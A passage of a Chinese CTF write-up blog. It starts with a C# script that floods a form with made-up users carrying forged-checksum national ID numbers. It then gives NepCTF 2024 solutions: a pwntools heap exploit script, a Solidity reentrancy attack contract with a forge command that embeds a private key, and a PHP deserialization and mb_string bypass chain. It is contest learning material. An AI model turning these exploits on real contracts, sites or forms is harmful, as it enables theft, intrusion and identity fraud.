httpClient.PostAsJsonAsync(<span class="hljs-string">$&quot;http://<span class="hljs-subst">&#123;url&#125;</span>/submit&quot;</span>, user);<br>   <span class="hljs-keyword">var</span> bak = <span class="hljs-keyword">await</span> res.Content.ReadAsStringAsync();<br>   Console.WriteLine(cnt++);<br>   <span class="hljs-keyword">if</span> (bak.IndexOf(<span class="hljs-string">&quot;uccessf&quot;</span>, StringComparison.Ordinal) == <span class="hljs-number">-1</span>)<br>   &#123;<br>       <br>   &#125;<br>&#125;<br>Console.ReadKey();<br><br><span class="hljs-function"><span class="hljs-built_in">string</span> <span class="hljs-title">genIdCard</span>(<span class="hljs-params">User u</span>)</span><br>&#123;<br>    <span class="hljs-keyword">var</span> idNumber = <span class="hljs-string">$&quot;510100<span class="hljs-subst">&#123;u.Birth.Year:<span class="hljs-number">0000</span>&#125;</span><span class="hljs-subst">&#123;u.Birth.Month:<span class="hljs-number">00</span>&#125;</span><span class="hljs-subst">&#123;u.Birth.Day:<span class="hljs-number">00</span>&#125;</span><span class="hljs-subst">&#123;Random.Shared.Next(<span class="hljs-number">10</span>,<span class="hljs-number">99</span>)&#125;</span><span class="hljs-subst">&#123;(u.Gender == Gender.Male ? <span class="hljs-number">1</span> : <span class="hljs-number">2</span>)&#125;</span>0&quot;</span>;<br>    <span class="hljs-comment">// lastChar</span><br>    <span class="hljs-built_in">long</span> n = <span class="hljs-number">0</span>;  <br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">long</span>.TryParse(idNumber.Remove(<span class="hljs-number">17</span>), <span class="hljs-keyword">out</span> n) == <span class="hljs-literal">false</span>   <br>        || n &lt; Math.Pow(<span class="hljs-number">10</span>, <span class="hljs-number">16</span>) || <span class="hljs-built_in">long</span>.TryParse(idNumber.Replace(<span class="hljs-string">&#x27;x&#x27;</span>, <span class="hljs-string">&#x27;0&#x27;</span>).Replace(<span class="hljs-string">&#x27;X&#x27;</span>, <span class="hljs-string">&#x27;0&#x27;</span>), <span class="hljs-keyword">out</span> n) == <span class="hljs-literal">false</span>)  <br>    &#123;  <br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;false&quot;</span>;<span class="hljs-comment">//数字验证  </span><br>    &#125;  <br>    <span class="hljs-built_in">string</span> address = <span class="hljs-string">&quot;11x22x35x44x53x12x23x36x45x54x13x31x37x46x61x14x32x41x50x62x15x33x42x51x63x21x34x43x52x64x65x71x81x82x91&quot;</span>;  <br>    <span class="hljs-keyword">if</span> (address.IndexOf(idNumber.Remove(<span class="hljs-number">2</span>)) == <span class="hljs-number">-1</span>)  <br>    &#123;  <br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;false&quot;</span>;<span class="hljs-comment">//省份验证  </span><br>    &#125;  <br>    <span class="hljs-built_in">string</span> birth = idNumber.Substring(<span class="hljs-number">6</span>, <span class="hljs-number">8</span>).Insert(<span class="hljs-number">6</span>, <span class="hljs-string">&quot;-&quot;</span>).Insert(<span class="hljs-number">4</span>, <span class="hljs-string">&quot;-&quot;</span>);  <br>    DateTime time = <span class="hljs-keyword">new</span> DateTime();  <br>    <span class="hljs-keyword">if</span> (DateTime.TryParse(birth, <span class="hljs-keyword">out</span> time) == <span class="hljs-literal">false</span>)  <br>    &#123;  <br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;false&quot;</span>;<span class="hljs-comment">//生日验证  </span><br>    &#125;  <br>    <span class="hljs-built_in">string</span>[] arrVarifyCode = (<span class="hljs-string">&quot;1,0,x,9,8,7,6,5,4,3,2&quot;</span>).Split(<span class="hljs-string">&#x27;,&#x27;</span>);  <br>    <span class="hljs-built_in">string</span>[] Wi = (<span class="hljs-string">&quot;7,9,10,5,8,4,2,1,6,3,7,9,10,5,8,4,2&quot;</span>).Split(<span class="hljs-string">&#x27;,&#x27;</span>);  <br>    <span class="hljs-built_in">char</span>[] Ai = idNumber.Remove(<span class="hljs-number">17</span>).ToCharArray();  <br>    <span class="hljs-built_in">int</span> sum = <span class="hljs-number">0</span>;  <br>    <span class="hljs-keyword">for</span> (<span class="hljs-built_in">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">17</span>; i++)  <br>    &#123;  <br>        sum += <span class="hljs-built_in">int</span>.Parse(Wi[i]) * <span class="hljs-built_in">int</span>.Parse(Ai[i].ToString());  <br>    &#125;  <br>    <span class="hljs-built_in">int</span> y = <span class="hljs-number">-1</span>;  <br>    Math.DivRem(sum, <span class="hljs-number">11</span>, <span class="hljs-keyword">out</span> y);<br>    idNumber = idNumber.Remove(<span class="hljs-number">17</span>,<span class="hljs-number">1</span>);<br>    idNumber += arrVarifyCode[y];<br>    <span class="hljs-keyword">return</span> idNumber;<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-built_in">enum</span> Gender<br>&#123;<br>    Male,<br>    Female<br>&#125;<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title">User</span><br>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-built_in">string</span> Name &#123; <span class="hljs-keyword">get</span>; <span class="hljs-keyword">set</span>; &#125;<br>    <span class="hljs-keyword">public</span> Gender Gender &#123; <span class="hljs-keyword">get</span>; <span class="hljs-keyword">set</span>; &#125; <span class="hljs-comment">// 0 boy\</span><br><br>    [<span class="hljs-meta">JsonPropertyName(<span class="hljs-string">&quot;sex&quot;</span>)</span>] <span class="hljs-keyword">public</span> <span class="hljs-built_in">string</span> Sex =&gt; Gender == Gender.Male ? <span class="hljs-string">&quot;男&quot;</span> : <span class="hljs-string">&quot;女&quot;</span>;<br>    <br>    <span class="hljs-keyword">public</span> DateTime Birth &#123;<span class="hljs-keyword">get</span>; <span class="hljs-keyword">set</span>; &#125;<br>    [<span class="hljs-meta">JsonPropertyName(<span class="hljs-string">&quot;phonenumber&quot;</span>)</span>]<span class="hljs-keyword">public</span> <span class="hljs-built_in">string</span> Phone &#123; <span class="hljs-keyword">get</span>; <span class="hljs-keyword">set</span>; &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-built_in">string</span> Ethnicity &#123; <span class="hljs-keyword">get</span>; <span class="hljs-keyword">set</span>; &#125;<br>    [<span class="hljs-meta">JsonPropertyName(<span class="hljs-string">&quot;idcard&quot;</span>)</span>]<span class="hljs-keyword">public</span> <span class="hljs-built_in">string</span> IdCard &#123; <span class="hljs-keyword">get</span>; <span class="hljs-keyword">set</span>; &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-built_in">string</span> Address &#123; <span class="hljs-keyword">get</span>; <span class="hljs-keyword">set</span>; &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-built_in">string</span> Position &#123; <span class="hljs-keyword">get</span>; <span class="hljs-keyword">set</span>; &#125;<br><br>    [<span class="hljs-meta">JsonPropertyName(<span class="hljs-string">&quot;age&quot;</span>)</span>]<br>    <span class="hljs-keyword">public</span> <span class="hljs-built_in">string</span> Age =&gt; (DateTime.Now.Year - Birth.Year).ToString();<br><br>    [<span class="hljs-meta">JsonPropertyName(<span class="hljs-string">&quot;experience&quot;</span>)</span>] <span class="hljs-keyword">public</span> <span class="hljs-built_in">string</span> Exp &#123; <span class="hljs-keyword">get</span>; <span class="hljs-keyword">set</span>; &#125; = Random.Shared.Next(<span class="hljs-number">2</span>, <span class="hljs-number">5</span>).ToString();<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/04/14/xEiSYaJQPkAOXgt.png" alt="image.png"></p><blockquote><p>发到1000后页面变成flag</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>wp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>NepCTF2024WP</title>
    <link href="/blog/wp/2024NepCTFWP/"/>
    <url>/blog/wp/2024NepCTFWP/</url>
    
    <content type="html"><![CDATA[<h1 id="NepCTF"><a href="#NepCTF" class="headerlink" title="NepCTF"></a>NepCTF</h1><h4 id="NepMagic-——-CheckIn"><a href="#NepMagic-——-CheckIn" class="headerlink" title="NepMagic —— CheckIn"></a>NepMagic —— CheckIn</h4><p>直接玩游戏就能出</p><p>注意有一关要把隐藏的方块全找到</p><h4 id="NepCamera"><a href="#NepCamera" class="headerlink" title="NepCamera"></a>NepCamera</h4><p>先使用tshark读取数据</p><p><img src="https://s2.loli.net/2024/08/26/9mW3OKsTV7zglRy.png" alt="b3657227838cd6157cd0e88421323058"></p><p>结果文件中发现大量jpeg头ffd8ffe0。</p><p><img src="https://s2.loli.net/2024/08/26/3h6YbWCdm4PlvSt.png" alt="b392c013471ecfb49879fa5f1e85d27b_720"></p><p>猜测是多个图片，编写脚本，提取出来。</p><p>脚本:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> re<br><br>inputFilePath=<span class="hljs-string">&quot;C:\\Downloads\\NepCamera\\result.txt&quot;</span><br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(inputFilePath, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>    hexData = file.read().replace(<span class="hljs-string">&quot;\n&quot;</span>, <span class="hljs-string">&quot;&quot;</span>).replace(<span class="hljs-string">&quot;\r&quot;</span>, <span class="hljs-string">&quot;&quot;</span>)  <br>    hexData = re.sub(<span class="hljs-string">r&#x27;[^0-9a-fA-F]&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, hexData)<br><br>marker = <span class="hljs-string">&quot;ffd8ffe0&quot;</span><br>startPositions = []<br><br><span class="hljs-comment"># FFD8FFE0 文件头</span><br>pos = <span class="hljs-number">0</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    pos = hexData.find(marker, pos)<br>    <span class="hljs-keyword">if</span> pos == -<span class="hljs-number">1</span>:<br>        <span class="hljs-keyword">break</span><br>    startPositions.append(pos)<br>    pos += <span class="hljs-built_in">len</span>(marker)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(startPositions)):<br>    start = <span class="hljs-built_in">max</span>(<span class="hljs-number">0</span>, startPositions[i] - <span class="hljs-number">24</span>)<br><br>    <span class="hljs-keyword">if</span> i + <span class="hljs-number">1</span> &lt; <span class="hljs-built_in">len</span>(startPositions):<br>        end = startPositions[i + <span class="hljs-number">1</span>]<br>    <span class="hljs-keyword">else</span>:<br>        end = <span class="hljs-built_in">len</span>(hexData)<br><br>    jpgData = hexData[start:end]<br><br>    <span class="hljs-comment"># 转为二进制数据</span><br>    jpgBytes = <span class="hljs-built_in">bytes</span>.fromhex(jpgData)<br><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;i + <span class="hljs-number">1</span>&#125;</span>.jpg&quot;</span>, <span class="hljs-string">&quot;wb&quot;</span>) <span class="hljs-keyword">as</span> imgFile:<br>        imgFile.write(jpgBytes)<br></code></pre></td></tr></table></figure><p>最终在图片里面找到flag。</p><h4 id="Nemophila"><a href="#Nemophila" class="headerlink" title="Nemophila"></a>Nemophila</h4><p>py解出来的是</p><p>secret_is{Frieren&amp;C_SunR15e&amp;Himme1_eterna1_10ve}</p><p>也是解压的密码</p><p>解压的图片与上面的异或</p><p>然后进行高度隐写</p><p><img src="https://s2.loli.net/2024/08/26/gHFfikdYoD31hsr.png" alt="image-20240826153112831"></p><h4 id="3DNep"><a href="#3DNep" class="headerlink" title="3DNep"></a>3DNep</h4><p>用微软商店自带的打开</p><p>然后是汉信码</p><p><img src="https://s2.loli.net/2024/08/26/wCn5abg98oOlsfe.png" alt="image-20240826153621308"></p><h4 id="火眼金睛"><a href="#火眼金睛" class="headerlink" title="火眼金睛"></a>火眼金睛</h4><p>binwalk分离固件</p><p>然后在19开头的文件里面有</p><p>一串base</p><p>然后解码   后面部分也在010里面</p><p><img src="https://s2.loli.net/2024/08/26/gfFRpIG8ArC1bJE.png" alt="7d8d95bda6803e996c3cc691eb5cb162"></p><p>NepCTF{Y0u_G0t_K33n_1nS1ght_1n_vXw0rKs!!!_L3t’s_G0_Furth3r}</p><h4 id="0ezAndroid"><a href="#0ezAndroid" class="headerlink" title="0ezAndroid"></a>0ezAndroid</h4><p>可以通过尝试hook主动调用</p><p>也通过反编译apk拿到加密的</p><p><img src="https://s2.loli.net/2024/08/26/NBq6CKMU4WdjYkg.png" alt="image-20240826220137286"></p><p><img src="https://s2.loli.net/2024/08/26/P14ruK5k9O8ysUE.png" alt="image-20240826220146461"></p><p>然后通过调试直接可以拿到flag</p><h4 id="NepSSH"><a href="#NepSSH" class="headerlink" title="NepSSH"></a>NepSSH</h4><p>在main函数可以看到flag被读入了byte_40C0中，并在0x123300开辟了0x1000字节大小的空间，在start_routine里看到会在0x123300处比较NepSSH，通过则输出flag的内容，我们的目的就是修改0x123300地址的内容。</p><p>我们可以通过两次fflush控制堆头，将链表指针指向0x123300，再修改即可</p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs moonscript"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-built_in">io</span> = remote(<span class="hljs-string">&#x27;neptune-xxxx.nepctf.lemonprefect.cn&#x27;</span>,<span class="hljs-number">443</span>, ssl=True, sni=True, typ=<span class="hljs-string">&quot;tcp&quot;</span>)<br><span class="hljs-built_in">io</span>.recvuntil(b<span class="hljs-string">&#x27;Username.\n&#x27;</span>)<br><span class="hljs-built_in">io</span>.sendline(b<span class="hljs-string">&#x27;admin&#x27;</span>)<br><span class="hljs-built_in">io</span>.recvuntil(b<span class="hljs-string">&#x27;Please enter password.\n&#x27;</span>)<br><span class="hljs-built_in">io</span>.sendline(b<span class="hljs-string">&#x27;admin&#x27;</span>)<br><span class="hljs-built_in">io</span>.recvuntil(b<span class="hljs-string">&#x27;You can now use ls.\n&#x27;</span>)<br><span class="hljs-built_in">io</span>.sendline(b<span class="hljs-string">&#x27;fflush&#x27;</span>)<br>sleep(<span class="hljs-number">0.5</span>)<br><span class="hljs-built_in">io</span>.sendline(b<span class="hljs-string">&#x27;fflush&#x27;</span>)<br>payload = p64(<span class="hljs-number">1</span>) + p64(<span class="hljs-number">0x1080</span>) + p64(<span class="hljs-number">0x123300</span>)<br>sleep(<span class="hljs-number">0.5</span>)<br><span class="hljs-built_in">io</span>.sendline(payload)<br>sleep(<span class="hljs-number">0.5</span>)<br><span class="hljs-built_in">io</span>.sendline(b<span class="hljs-string">&#x27;fflush&#x27;</span>)<br>sleep(<span class="hljs-number">0.5</span>)<br><span class="hljs-built_in">io</span>.sendline(b<span class="hljs-string">&#x27;NepSSH&#x27;</span>)<br><span class="hljs-built_in">io</span>.interactive()<br></code></pre></td></tr></table></figure><h4 id="theif-god"><a href="#theif-god" class="headerlink" title="theif_god"></a>theif_god</h4><p>打重入就行了（解锁 Flag 的条件还是 msg.sender 在 Bank 中的 balance &#x3D;&#x3D; 50 ether，，这个条件也挺抽象的，最后打完重入还要再存一步。）</p><p>Poc：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: UNLICENSED<br>pragma solidity ^0.8.13;<br><br>import &#123;Script, console&#125; from &quot;forge-std/Script.sol&quot;;<br>import &#123;Bank&#125; from &quot;../src/Bank.sol&quot;;<br><br>contract Hack &#123;<br>    Bank target;<br><br>    constructor(address _target) &#123;<br>        target = Bank(_target);<br>    &#125;<br><br>    function pwn() external payable &#123;<br>        target.deposit&#123;value: msg.value&#125;();<br>        target.withdraw();<br>    &#125;<br><br>    function deposit() external &#123;<br>        target.deposit&#123;value: 50 ether&#125;();<br>    &#125;<br><br>    function getFlag() external view returns (string memory) &#123;<br>        return target.getFlag();<br>    &#125;<br><br>    receive() external payable &#123;<br>        if (target.getBalance() != 0) &#123;<br>            target.withdraw();<br>        &#125;<br>    &#125;<br>&#125;<br><br>contract Attack is Script &#123;<br>    function run() external &#123;<br>        uint256 balance = Bank(0xA86Cb9aCABb3E6629a47d676BEB38e2455B20917).getBalance();<br>        console.log(&quot;balance: &quot;, balance);<br><br>        vm.startBroadcast();<br>        Hack hack = new Hack(0xA86Cb9aCABb3E6629a47d676BEB38e2455B20917);<br>        hack.pwn&#123;value: 0.5 ether&#125;();<br>        balance = address(hack).balance;<br>        console.log(&quot;Hack balance: &quot;, balance);<br>        hack.deposit();<br>        string memory flag = hack.getFlag();<br>        vm.stopBroadcast();<br><br>        console.log(&quot;flag: &quot;, flag);<br>    &#125;<br>&#125;<br>forge script script\Attack.s.sol --rpc-url https://neptune-xxxx.nepctf.lemonprefect.cn --private-key 0x4b609fde92771ee750dac4d0aace6c9cf34e341229dbda382e49c492ad206e5e --tc Attack --evm-version cancun<br></code></pre></td></tr></table></figure><h4 id="Super-Neuro-Escape-from-Flame"><a href="#Super-Neuro-Escape-from-Flame" class="headerlink" title="Super Neuro : Escape from Flame!"></a>Super Neuro : Escape from Flame!</h4><p>硬玩游戏</p><p><strong>发现了触碰一下墙可以无限跳</strong></p><p>按住A疯狂按空格就能螺旋升天</p><p><img src="https://s2.loli.net/2024/08/26/MixfBQ6upwcNyOb.png" alt="image-20240826161044364"></p><p>当时忘记截图了，反正能飞</p><h4 id="PHP-MASTER"><a href="#PHP-MASTER" class="headerlink" title="PHP_MASTER!!"></a>PHP_MASTER!!</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">substrstr</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$start</span> = <span class="hljs-title function_ invoke__">mb_strpos</span>(<span class="hljs-variable">$data</span>, <span class="hljs-string">&quot;[&quot;</span>);<br>    <span class="hljs-variable">$end</span> = <span class="hljs-title function_ invoke__">mb_strpos</span>(<span class="hljs-variable">$data</span>, <span class="hljs-string">&quot;]&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">mb_substr</span>(<span class="hljs-variable">$data</span>, <span class="hljs-variable">$start</span> + <span class="hljs-number">1</span>, <span class="hljs-variable">$end</span> - <span class="hljs-number">1</span> - <span class="hljs-variable">$start</span>);<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$key</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">readflag</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;key === <span class="hljs-string">&quot;\0key\0&quot;</span>) &#123;<br>            <span class="hljs-variable">$a</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-number">1</span>];<br>            <span class="hljs-variable">$contents</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$a</span>);<br>            <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$a</span>, <span class="hljs-variable">$contents</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">B</span></span><br><span class="hljs-class"></span>&#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__tostring</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\[|\]/i&quot;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;nep&#x27;</span>])) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;NONONO!!!&quot;</span>);<br>        &#125;<br>        <span class="hljs-variable">$str</span> = <span class="hljs-title function_ invoke__">substrstr</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;nep1&#x27;</span>] . <span class="hljs-string">&quot;[welcome to&quot;</span> . <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;nep&#x27;</span>] . <span class="hljs-string">&quot;CTF]&quot;</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$str</span>;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$str</span> === <span class="hljs-string">&#x27;NepCTF]&#x27;</span>) &#123;<br>            <span class="hljs-keyword">return</span> (<span class="hljs-variable language_">$this</span>-&gt;b)();<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C</span></span><br><span class="hljs-class"></span>&#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$s</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$s</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;s = <span class="hljs-variable">$s</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br><br><br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;str;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$ser</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">C</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]));<br><span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">str_ireplace</span>(<span class="hljs-string">&quot;\0&quot;</span>, <span class="hljs-string">&quot;00&quot;</span>, <span class="hljs-variable">$ser</span>);<br><span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$data</span>);<br><br></code></pre></td></tr></table></figure><p>本题涉及到了: <code>反序列化 - 字符逃逸</code>, <code>mb_string 长度判断错误问题</code>, <code>伪协议</code></p><p>首先是映入眼帘的:</p><p><code>mb_string</code> 长度判断错误: <a href="https://blog.csdn.net/Sa1nZen/article/details/139046383">参考文章</a></p><blockquote><p>当以 \xF0 开头的字节序列出现在 UTF-8 编码中时，通常表示一个四字节的 Unicode 字符。这是因为 UTF-8 编码规范定义了以 \xF0 开头的字节序列用于编码较大的 Unicode 字符。<br>不符合4位的规则的话，mb_substr和mb_strpos执行存在差异：<br>(1)mb_strpos遇到\xF0时，会把无效字节先前的字节视为一个字符，然后从无效字节重新开始解析<br>mb_strpos(“\xf0\x9fAAA&lt;BB”, ‘&lt;’); #返回4 \xf0\x9f视作是一个字节，从A开始变为无效字节 #A为\x41  上述字符串其认为是7个字节</p><p>(2)mb_substr遇到\xF0时，会把无效字节当做四字节Unicode字符的一部分，然后继续解析<br>mb_substr(“\xf0\x9fAAA&lt;BB”, 0, 4); #”\xf0\x9fAAA&lt;B” \xf0\x9fAA视作一个字符 上述字符串其认为是5个字节</p><p>结论：mb_strpos相对于mb_substr来说，可以把索引值向后移动</p></blockquote><blockquote><p>通过控制后面的串的长度可以控制我们想要执行$key的长度<br>通过控制前面我们可以控制索引值需要提前几位<br>每发送一个%f0abc，mb_strpos认为是4个字节，mb_substr认为是1个字节，相差3个字节<br>每发送一个%f0%9fab,mb_strpos认为是3个字节，mb_substr认为是1个字节，相差2个字节<br>每发送一个%f0%9f%9fa,mb_strpos认为是2个字节，mb_substr认为是1个字节，相差1个字节</p></blockquote><p>此题需要我们跳过 <code>[welcome to</code>, 共 10 字节, 于是我们构造 <code>%f0abc%f0abc%f0abc%f0%9f%9fa</code> (3*3+1), 于是 <code>nep1</code> 为 <code>%f0abc%f0abc%f0abc%f0%9f%9fa</code>, nep 为 <code>Nep</code></p><p>第二个的话我们可以看到 <code>反序列化长度绕过</code>, 参考 Kengwang 的文章: <a href="https://blog.kengwang.com.cn/archives/599/#%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8">[CTF&#x2F;Web] PHP 反序列化学习笔记#字符逃逸</a>, 我们可以先构造出后半段的 payload.</p><p>后半段有几个考点, 一个是关于 <code>callable</code> 的, 如果需要对一个对象的指定成员方法进行 <code>call</code>, 我们需要使用 <code>[$var, &#39;function_name&#39;]</code> 来调用, 所以我们的链子如下:</p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs haxe"><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-type">A</span>();<br><span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> <span class="hljs-type">B</span>();<br><span class="hljs-variable">$c</span> = <span class="hljs-keyword">new</span> <span class="hljs-type">C</span>();<br><br><span class="hljs-variable">$c</span>-&gt;str = <span class="hljs-variable">$b</span>;<br><span class="hljs-variable">$b</span>-&gt;b = [<span class="hljs-variable">$a</span>, <span class="hljs-string">&#x27;readflag&#x27;</span>];<br><span class="hljs-variable">$a</span>-&gt;key = <span class="hljs-string">&quot;\0key\0&quot;</span>;<br><br>echo serialize(<span 